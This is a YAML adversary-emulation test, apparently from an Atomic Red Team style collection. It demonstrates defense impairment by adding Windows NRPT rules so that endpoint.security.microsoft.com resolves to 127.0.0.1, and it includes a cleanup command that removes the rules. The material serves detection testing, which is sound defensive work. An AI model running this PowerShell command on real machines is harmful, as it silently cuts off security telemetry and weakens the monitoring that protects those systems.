- requirements: []
  name: Soumaia ART Tests - Block Cybersecurity communication by leveraging Windows Name Resolution Policy Table
  description: Adversaries are redirecting DNS queries to an incorrect or malicious DNS server IP, thereby blocking legitimate communications and potentially compromising the security infrastructure. This atomic test aims to respond with 127.0.0.1 when a DNS query is made for endpoint.security.microsoft.com. (requires elevation)
  tactic: defense-impairment
  technique_id: T1685
  technique_name: Disable or Modify Tools
  executors:
  - cleanup:
    - 'try { $DnsClientNrptRules = Get-DnsClientNrptRule | Where-Object { $_.Comment -eq ''Silenced by Name Resolution Policy Table'' }; foreach ($rule in $DnsClientNrptRules) { Remove-DnsClientNrptRule -Name $rule.Name -Force }; Clear-DnsClientCache; Write-Host "All NRPT rules have been removed and the DNS cache has been cleared." } catch { Write-Host "An error occurred: $_" }; Clear-DnsClientCache'
    timeout: 60
    platform: windows
    name: psh
    payloads: []
    parsers: []
    command: Add-DnsClientNrptRule -Namespace ".endpoint.security.microsoft.com" -NameServers 127.0.0.1 -Comment "Silenced by Name Resolution Policy Table"; Add-DnsClientNrptRule -Namespace "endpoint.security.microsoft.com" -NameServers 127.0.0.1 -Comment "Silenced by Name Resolution Policy Table"; Clear-DnsClientCache
  id: 2b285878-4cdf-5cc1-b271-27b64574a205
